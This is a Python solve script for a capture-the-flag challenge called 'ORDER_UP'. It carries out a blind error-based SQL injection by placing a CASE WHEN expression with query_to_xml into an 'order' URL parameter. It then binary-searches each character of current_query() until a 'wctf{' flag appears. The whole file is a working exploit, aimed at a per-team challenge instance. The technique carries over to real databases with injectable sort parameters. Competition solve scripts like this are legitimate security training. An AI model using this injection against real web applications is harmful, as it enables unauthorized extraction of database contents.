import os
import requests

# Note: This chal has per-team instances SO you have to spin up your instance
# and THEN set it here before.
URL = os.getenv('CHAL_URL') or 'https://dyn-svc-order-up-ps28rtskmrv67quba0hu-okntin33tq-ul.a.run.app/'
URL = URL + '/query'

def tryUrl(expression):
    order = f"CASE WHEN ({expression}) THEN item_name ELSE ''||query_to_xml('bad-query',true,true,'') END"
    params = {'col1': 'item_name', 'order': order}

    response = requests.get(URL, params=params, timeout=20)
    # print(response.status_code, response.text)

    return 'Error' not in response.text




def probeValueAtOffset(value, charOffset):

    lowGuessIndex = 1
    highGuessIndex = 126

    while lowGuessIndex < highGuessIndex:
        guessIndex = lowGuessIndex + (highGuessIndex - lowGuessIndex) // 2;

        expression = f"ascii(substring({value}, {charOffset}, 1)) >= {guessIndex}"
        # print(expression)

        if tryUrl(expression):
            if lowGuessIndex == guessIndex:
                return chr(guessIndex)
            lowGuessIndex = guessIndex
        else:
            highGuessIndex = guessIndex

    return False


def runQuery():
    value = """"""
    expression = """current_query()"""
    # expression = """version()"""
    offset = len(value)
    while True:
        offset += 1
        nextChar = probeValueAtOffset(expression, offset)
        if not nextChar:
            return value
        value += nextChar
        print(value)

        if 'wctf{' in value and '}' in value:
            print('SOLVED: ORDER_UP flag 1!')
            break
            

    return value

value = runQuery()

print('-------------------------------------')
if 'wctf{' not in value:
    print('FAILED to find flag 1')

